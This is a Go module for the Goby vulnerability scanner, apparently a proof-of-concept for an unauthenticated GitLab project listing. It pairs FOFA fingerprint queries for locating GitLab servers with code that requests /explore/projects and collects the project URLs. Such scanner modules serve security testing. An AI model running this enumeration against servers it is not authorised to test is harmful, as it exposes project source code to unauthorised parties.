package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Gitlab Unauthorized Access Vulnerability",
    "Description": "<p>GitLab is an open-source application developed using Ruby on Rails, which implements a self hosted Git project repository and allows access to public or private projects through a web interface.</p><p>GitLab has an unauthorized vulnerability, which can be exploited by attackers to access the project and launch further attacks on the corresponding system by viewing and understanding the project source code.</p>",
    "Product": "GitLab",
    "Homepage": "https://about.gitlab.com/",
    "DisclosureDate": "2024-04-01",
    "PostTime": "2024-04-02",
    "Author": "2367018324@qq.com",
    "FofaQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "GobyQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "Level": "0",
    "Impact": "<p>GitLab has an unauthorized vulnerability, which can be exploited by attackers to access the project and launch further attacks on the corresponding system by viewing and understanding the project source code.</p>",
    "Recommendation": "<p>1. Please follow the official link: <a href=\"https://about.gitlab.com/update/\">https://about.gitlab.com/update/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "select",
            "value": "/explore/projects",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/explore/projects",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko)"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Explore public groups to find projects to contribute to",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/explore/projects",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.8",
    "Translation": {
        "CN": {
            "Name": "Gitlab 未授权访问漏洞",
            "Product": "GitLab",
            "Description": "<p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目。</p><p>&nbsp;GitLab 存在未授权漏洞，攻击者可以利用此漏洞访问项目，通过查看和了解项目源代码对相应系统发起进一步的攻击。<br></p>",
            "Recommendation": "<p>1、请关注官方链接：<a href=\"https://about.gitlab.com/update/\" target=\"_blank\">https://about.gitlab.com/update/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>GitLab 存在未授权漏洞，攻击者可以利用此漏洞访问项目，通过查看和了解项目源代码对相应系统发起进一步的攻击。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Gitlab Unauthorized Access Vulnerability",
            "Product": "GitLab",
            "Description": "<p>GitLab is an open-source application developed using Ruby on Rails, which implements a self hosted Git project repository and allows access to public or private projects through a web interface.</p><p>GitLab has an unauthorized vulnerability, which can be exploited by attackers to access the project and launch further attacks on the corresponding system by viewing and understanding the project source code.</p>",
            "Recommendation": "<p>1. Please follow the official link: <a href=\"https://about.gitlab.com/update/\">https://about.gitlab.com/update/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>GitLab has an unauthorized vulnerability, which can be exploited by attackers to access the project and launch further attacks on the corresponding system by viewing and understanding the project source code.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10940"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/explore/projects"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
			resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
			if err == nil {
				var slice []string
				tags := strings.Split(string(resp.RawBody), "<a ")
				for _, tag := range tags {
					if strings.Contains(tag, `class="project"`) {
						hrefIndex := strings.Index(tag, `href="`)
						if hrefIndex != -1 {
							hrefEndIndex := strings.Index(tag[hrefIndex+len(`href="`):], `"`) + hrefIndex + len(`href="`)
							href := tag[hrefIndex+len(`href="`) : hrefEndIndex]
							slice = append(slice, href)
						}
					}
				}
				result := strings.Join(slice, ", ")
				if result != "" {
					ss.VulURL = hostInfo.FixedHostInfo + uri
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/explore/projects"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err == nil {
				var slice []string
				tags := strings.Split(string(resp.RawBody), "<a ")
				for _, tag := range tags {
					if strings.Contains(tag, `class="project"`) {
						hrefIndex := strings.Index(tag, `href="`)
						if hrefIndex != -1 {
							hrefEndIndex := strings.Index(tag[hrefIndex+len(`href="`):], `"`) + hrefIndex + len(`href="`)
							href := tag[hrefIndex+len(`href="`) : hrefEndIndex]
							slice = append(slice, expResult.HostInfo.FixedHostInfo + href)
						}
					}
				}
				result := strings.Join(slice, ", ")
				expResult.Output = result
				expResult.Success = true
				return expResult
			} else {
				expResult.Success = false
				expResult.Output = "利用失败"
				return expResult
			}
			return expResult
		},
	))
}
